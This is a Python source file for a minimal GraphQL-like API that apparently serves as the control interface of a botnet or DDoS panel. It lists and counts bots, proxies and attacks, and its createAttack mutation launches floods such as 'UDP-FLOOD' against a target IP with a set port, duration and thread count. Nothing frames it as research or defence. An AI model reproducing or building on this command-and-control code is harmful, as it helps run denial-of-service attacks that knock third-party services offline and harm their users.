"""api/graphql_api.py — minimal GraphQL-like JSON API (no external deps)"""
from typing import Any, Dict

QUERIES = ["bots", "attacks", "proxies", "users", "stats"]
MUTATIONS = ["createAttack", "createBot", "createProxy", "createUser"]

def execute(query: str, variables: Dict = None, context: Dict = None) -> Dict[str, Any]:
    """
    Very small subset:
      { bots { count } }
      { stats }
      mutation { createAttack(method: \"UDP-FLOOD\", target: \"1.2.3.4\") }
    """
    variables = variables or {}
    context = context or {}
    q = (query or "").strip()
    data = {}
    errors = []

    try:
        if "bots" in q and context.get("bot_mgr"):
            bots = context["bot_mgr"].get_all()
            data["bots"] = {"count": len(bots), "items": bots[:50]}
        if "proxies" in q and context.get("proxy_mgr"):
            px = context["proxy_mgr"].get_all_proxies()
            data["proxies"] = {"count": len(px), "items": px[:50]}
        if "attacks" in q and context.get("attack_mgr"):
            at = context["attack_mgr"].get_all_attacks()
            data["attacks"] = {"count": len(at), "items": at[:50]}
        if "stats" in q:
            data["stats"] = {
                "bots": context["bot_mgr"].get_stats() if context.get("bot_mgr") else {},
                "proxies": context["proxy_mgr"].get_stats() if context.get("proxy_mgr") else {},
                "attacks": context["attack_mgr"].get_stats() if context.get("attack_mgr") else {},
            }
        if "createAttack" in q and context.get("attack_mgr"):
            method = variables.get("method", "UDP-FLOOD")
            target = variables.get("target", variables.get("target_ip", ""))
            a = context["attack_mgr"].create_attack({
                "method": method,
                "target_ip": target,
                "target_port": int(variables.get("port", 80)),
                "duration": int(variables.get("duration", 60)),
                "threads": int(variables.get("threads", 100)),
            })
            data["createAttack"] = a
    except Exception as e:
        errors.append({"message": str(e)})

    out = {"data": data}
    if errors:
        out["errors"] = errors
    return out
